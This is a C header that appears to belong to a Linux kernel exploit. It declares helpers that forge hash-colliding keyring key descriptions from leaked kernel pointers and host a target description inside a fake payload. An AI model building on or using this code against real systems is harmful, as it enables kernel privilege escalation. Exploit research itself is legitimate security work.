#ifndef K2_TARGET_GEN_H
#define K2_TARGET_GEN_H

#include <stdbool.h>
#include <stddef.h>
#include <stdint.h>

#define K2_COLLISION_KEYS 17U
#define K2_LONG_DESC_MAX 128U
#define K2_PERMUTATIONS 120U
#define K2_TARGET_LEN 13U

/*
 * The upstream harness shipped ~2400 pre-filtered kernel rodata strings with
 * their link addresses.  Both are build specific, so here the target and its
 * 16 hash-colliding siblings are generated on the fly from the leaked
 * key_type_user / default_domain_tag pointers, and the target description is
 * hosted inside the fake payload (k2l.desc_off).
 */

struct k2_collision_class {
    char descriptions[K2_COLLISION_KEYS][K2_LONG_DESC_MAX];
    size_t length;
    uint64_t hash;
    unsigned int fake_slot;
    unsigned int tested_prefixes;
};

struct k2_target_choice {
    char description[K2_LONG_DESC_MAX];
    size_t length;
    uint64_t hash;
    struct k2_collision_class collision;
};

uint64_t k2_key_hash(uint64_t type, uint64_t domain,
                     const unsigned char *description, size_t length,
                     bool keyring);
uint64_t k2_index_x(const char *description, size_t length);
int k2_build_target(uint64_t type, uint64_t domain, uint64_t fake_leaf,
                    unsigned int fake_slot,
                    struct k2_target_choice *choice);
int k2_find_outlier(uint64_t type, uint64_t domain, uint64_t class_hash,
                    char output[32], uint64_t *outlier_hash);

#endif
